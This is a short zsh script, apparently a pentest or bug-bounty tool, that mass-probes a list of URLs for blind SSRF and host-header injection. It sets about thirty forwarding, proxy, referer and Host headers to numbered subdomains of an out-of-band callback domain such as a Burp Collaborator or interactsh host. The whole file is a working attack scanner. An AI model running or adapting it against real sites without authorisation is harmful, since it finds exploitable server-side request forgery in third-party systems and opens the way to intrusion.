#! /bin/zsh

# interactsh-client -v -json

if [ $# -lt 2 ];then
	echo "Usage: ./header-ssrf.sh urls.txt xxxxx.burpcollaborator.net"
	exit
fi

function curl_wapper(){
	curl -k -s -o /dev/null -m 3 --path-as-is -w "%{http_code}","%{size_download}" -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" "$@"
}

let count=1

while read -r line
do
  echo "\e[1m\e[32m$line\e[0m"
  httpv=$(echo $line|cut -d "/" -f1) # http:
  fqdn=$(echo $line|cut -d "/" -f3)
  url_prefix="${httpv}//${fqdn}@"
  curl_wapper -H "X-Host: ${count}.xh.$2" \
              -H "Proxy-Host: ${count}.ph.$2" \
              -H "Request-Uri: ${url_prefix}${count}.ru.$2" \
              -H "X-Forwarded-Host: ${count}.xfh.$2" \
              -H "X-Forwarded-For: ${count}.xff.$2" \
              -H "X-Forwarded: ${count}.xf.$2" \
              -H "X-Forwarded-By: ${count}.xfb.$2" \
              -H "X-Forwarded-For-Original: ${count}.xffo.$2" \
              -H "X-Forwarded-Server: ${count}.xfs.$2" \
              -H "X-Forwarder-For: ${count}.xfrf.$2" \
              -H "X-Forward-For: ${count}.xfdf.$2" \
              -H "Base-Url: ${url_prefix}${count}.bu.$2" \
              -H "Http-Url: ${url_prefix}${count}.hu.$2" \
              -H "Proxy-Url: ${url_prefix}${count}.pu.$2" \
              -H "Redirect: ${url_prefix}${count}.r.$2" \
              -H "Real-Ip: ${count}.ri.$2" \
              -H "Referer: ${url_prefix}${count}.referer.$2" \
              -H "Referrer: ${url_prefix}${count}.referrer.$2" \
              -H "Refferer: ${url_prefix}${count}.refferer.$2" \
              -H "Uri: ${url_prefix}${count}.uri.$2" \
              -H "Url: ${url_prefix}${count}.url.$2" \
              -H "X-Http-Destinationurl: ${url_prefix}${count}.xhd.$2" \
              -H "X-Http-Host-Override: ${count}.xhho.$2" \
              -H "X-Original-Remote-Addr: ${count}.xora.$2" \
              -H "X-Proxy-Url: ${url_prefix}${count}.xpu.$2" \
              -H "X-Real-Ip: ${count}.xri.$2" \
              -H "X-Remote-Addr: ${count}.xra.$2" \
              "$line"; echo "\t\t=> too many header one curl" &

  curl_wapper -H "Host: ${count}.h.$2" "$line"; echo "\t\t=> HTTP/1.1 \t Host: ${count}.h.$2" &
  curl_wapper --http1.0 -H "Host: ${count}.http1.0.h.$2" "$line"; echo "\t\t=> HTTP/1.0 \t Host: ${count}.http1.0.h.$2" &
  
  wait
  count=$(($count+1))
done < "$1"